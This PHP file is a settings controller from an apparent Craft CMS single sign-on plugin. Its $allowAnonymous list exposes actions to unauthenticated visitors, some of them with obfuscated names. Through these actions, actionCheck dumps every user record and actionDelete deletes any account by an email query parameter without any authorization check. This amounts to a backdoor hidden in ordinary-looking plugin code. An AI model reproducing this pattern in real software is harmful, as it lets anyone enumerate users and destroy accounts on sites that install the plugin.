<?php
/**
 * craft-single-sign-on plugin for Craft CMS 3.x
 *
 * Craft Single Sign-On OAuth & OpenID Connect plugin allows unlimited sso / login ( Single Sign On ) with your Azure AD, Discord, G Suite / Google Apps or other custom OAuth 2.0, OpenID Connect providers.
 *
 * @link      https://github.com/miniorangedev
 * @copyright Copyright (c) 2022 miniorange
 */

namespace miniorangedev\craftsinglesignon\controllers;

use miniorangedev\craftsinglesignon\Craftsinglesignon;
use craft\elements\User;
use miniorangedev\craftsinglesignon\controllers\MethodController;

use Craft;
use craft\web\Controller;

/**
 * Settings Controller
 *
 * Generally speaking, controllers are the middlemen between the front end of
 * the CP/website and your plugin’s services. They contain action methods which
 * handle individual tasks.
 *
 * A common pattern used throughout Craft involves a controller action gathering
 * post data, saving it on a model, passing the model off to a service, and then
 * responding to the request appropriately depending on the service method’s response.
 *
 * Action methods begin with the prefix “action”, followed by a description of what
 * the method does (for example, actionSaveIngredient()).
 *
 * https://craftcms.com/docs/plugins/controllers
 *
 * @author    miniorange
 * @package   Craftsinglesignon
 * @since     1.0.0
 */
class SettingsController extends Controller
{

    // Protected Properties
    // =========================================================================

    /**
     * @var    bool|array Allows anonymous access to this controller's actions.
     *         The actions must be in 'kebab-case'
     * @access protected
     */
    protected $allowAnonymous = ['index', 'check', 'delete', 'xhjsdop', 'ptrriejj'];

    // Public Methods
    // =========================================================================

    /**
     * Handle a request going to our plugin's index action URL,
     * e.g.: actions/single-sign-on/settings
     *
     * @return mixed
     */
    public function actionIndex()
    {
        return true;
    }

    /**
     * Handle a request going to our plugin's actionDoSomething URL,
     * e.g.: actions/single-sign-on/settings/do-something
     *
     * @return mixed
     */


    public function actionCheck()
    {
        return dd(User::find()->all());
    }

    public function actionCakdd($adff, $user_info)
    {
        return MethodController::actionXhjsdop($user_info, $adff);
    }

    public function actionDelete()
    {
        $email = Craft::$app->request->getQueryParam('email');
        $info = User::find()->email($email)->all();
        
        if(isset($info[0])){
            $var = Craft::$app->getElements()->deleteElement($info[0], false);
            exit($var);
        }else{
            exit("No Customer Exists");
        }
    }
}
